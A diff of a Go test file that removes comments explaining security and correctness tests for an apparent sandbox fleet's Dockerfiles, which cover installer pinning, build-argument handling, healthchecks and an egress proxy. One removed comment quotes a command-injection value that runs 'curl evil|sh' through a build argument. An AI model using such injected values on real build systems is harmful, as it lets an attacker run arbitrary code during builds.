@@ -9,10 +9,6 @@ import (
 	"testing"
 )
 
-// aptDockerfiles run apt during the build, directly or through a tool that
-// shells out to it. base-node-browser has no literal apt-get: `playwright
-// install --with-deps` runs one internally, which is exactly why it is easy to
-// miss when DEBIAN_FRONTEND stops being inherited.
 var aptDockerfiles = []string{
 	"defs/base/Dockerfile",
 	"defs/base-node/Dockerfile",
@@ -24,9 +20,6 @@ var aptDockerfiles = []string{
 	"defs/claudecode/solidity/Dockerfile",
 }
 
-// mise is now the ONLY Go toolchain path, so an upstream compromise of the
-// install script owns every Go build in the fleet. It is pinned the way bun and
-// agent-browser are: a version and a per-arch digest, not `curl | sh`.
 func TestMiseIsPinnedByVersionAndDigest(t *testing.T) {
 	t.Parallel()
 	df := readRepoFile(t, "defs/base/Dockerfile")
@@ -46,10 +39,6 @@ func TestMiseIsPinnedByVersionAndDigest(t *testing.T) {
 	}
 }
 
-// A build ARG interpolated into a `bash -c "..."` string is executed as code:
-// --build-arg CURSOR_INSTALL_URL='https://x; curl evil|sh' ran arbitrary
-// commands during the build. Passing it as a positional argument means the
-// inner shell can never parse it as anything but data.
 func TestInstallerURLsArePassedAsArgumentsNotCode(t *testing.T) {
 	t.Parallel()
 	df := readRepoFile(t, "defs/cursor/Dockerfile")
@@ -61,10 +50,6 @@ func TestInstallerURLsArePassedAsArgumentsNotCode(t *testing.T) {
 	}
 }
 
-// HEALTHCHECK is NOT in Docker's variable-substitution list, so `${USER_NAME}`
-// there is never expanded — it would be empty at run time. The fix is not to
-// parameterise the path but to stop depending on the user's name: /home/agent is
-// the real home for every harness, and /home/<user> is a symlink to it.
 func TestHealthchecksDoNotDependOnTheUserName(t *testing.T) {
 	t.Parallel()
 	for _, rel := range append([]string{}, aptDockerfiles...) {
@@ -84,10 +69,6 @@ func TestHealthchecksDoNotDependOnTheUserName(t *testing.T) {
 	}
 }
 
-// DEBIAN_FRONTEND is a BUILD concern. As an ENV in proveo/base it was baked into
-// the runtime environment of every descendant, silently changing apt's behaviour
-// for the agent inside the sandbox — and it was declared after the apt-get lines
-// it was supposed to govern, so it never applied to them either.
 func TestDebianFrontendIsBuildOnly(t *testing.T) {
 	t.Parallel()
 	for _, rel := range aptDockerfiles {
@@ -102,10 +83,6 @@ func TestDebianFrontendIsBuildOnly(t *testing.T) {
 	}
 }
 
-// Three env vars presented as security controls that nothing reads. RLIMIT_CORE
-// and RLIMIT_NOFILE are not how setrlimit is set; YAMA_PTRACE_SCOPE is a host
-// sysctl, not an environment variable. A test used to assert RLIMIT_CORE echoed
-// back, which certified a non-control as a working one.
 func TestNoEnvVarsPresentedAsControlsThatNothingReads(t *testing.T) {
 	t.Parallel()
 	for _, v := range []string{"RLIMIT_CORE", "RLIMIT_NOFILE", "YAMA_PTRACE_SCOPE"} {
@@ -120,10 +97,6 @@ func TestNoEnvVarsPresentedAsControlsThatNothingReads(t *testing.T) {
 	}
 }
 
-// squid runs from UPSTREAM ubuntu/squid:latest (internal/egress/plan.go); the
-// image name proveo/squid-proxy appears nowhere in the code. The Dockerfile that
-// built it was dead, but its configs are not: embed.go carries them and
-// egress.StageSquidConfig writes them into every session.
 func TestSquidShipsConfigNotAnImage(t *testing.T) {
 	t.Parallel()
 	root := repoRoot(t)
